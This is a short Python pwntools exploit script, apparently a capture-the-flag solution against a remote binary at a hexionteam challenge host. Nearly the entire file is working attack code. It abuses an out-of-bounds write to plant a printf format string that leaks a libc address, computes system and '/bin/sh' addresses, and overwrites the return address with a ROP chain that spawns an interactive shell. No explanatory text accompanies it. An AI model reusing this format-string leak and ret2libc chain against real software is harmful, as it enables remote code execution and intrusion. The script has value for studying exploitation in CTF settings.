from pwn import *
import time
printf_plt=0x0000000000400590
entry=0x4005d0
pop_rdi=0x00000000004008a3
ret=0x000000000040056e
libc_start_main_got=0x0000000000600ff0
offset_eip=45
amount_offset=-7

def write(p,offset,value):
	to_write=p64(value)
	for i in range(8):
		p.sendline(str(offset+i))
		p.sendline(to_write[i])


#p=process("./www")
p=remote("challenges1.hexionteam.com",3002)


write(p,amount_offset,23)

write(p,0,0x7024393225)
write(p,offset_eip,entry)
# leak - 0x401733
leak=int(p.recv().strip()[2:],16)
base=leak-0x401733
system=base+0x000000000004f440
binsh=base+0x1b3e9a
print "leak:",hex(leak)
print "base:",hex(base)
print "system:",hex(system)
print "binsh:",hex(binsh)

write(p,amount_offset,39)

write(p,offset_eip,ret)
write(p,offset_eip+8,pop_rdi)
write(p,offset_eip+16,binsh)
write(p,offset_eip+24,system)

p.interactive()
#45






















